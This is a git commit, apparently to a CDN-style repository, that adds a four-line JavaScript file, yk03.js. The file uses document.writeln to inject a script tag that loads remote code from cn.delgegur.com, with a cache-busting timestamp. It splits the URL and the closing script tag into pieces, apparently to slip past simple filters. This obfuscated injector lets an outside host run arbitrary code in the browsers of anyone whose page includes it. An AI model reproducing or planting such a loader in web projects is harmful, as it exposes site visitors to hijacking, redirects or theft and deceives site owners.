39e561bccc2d0ded9bce5edabb585906e33c2939
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-10-21 20:00:06 +0800

    Add files via upload

---
+++ yk03.js
@@ -0,0 +1,4 @@
+document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
+document.writeln('tps:')
+document.writeln('//cn.delgegur.com/142/EX8NDYGmQ2JpXxHkQYLuUV.shtml?'+new Date().getTime()+'"')
+document.writeln('><\/scr' + 'ipt>')
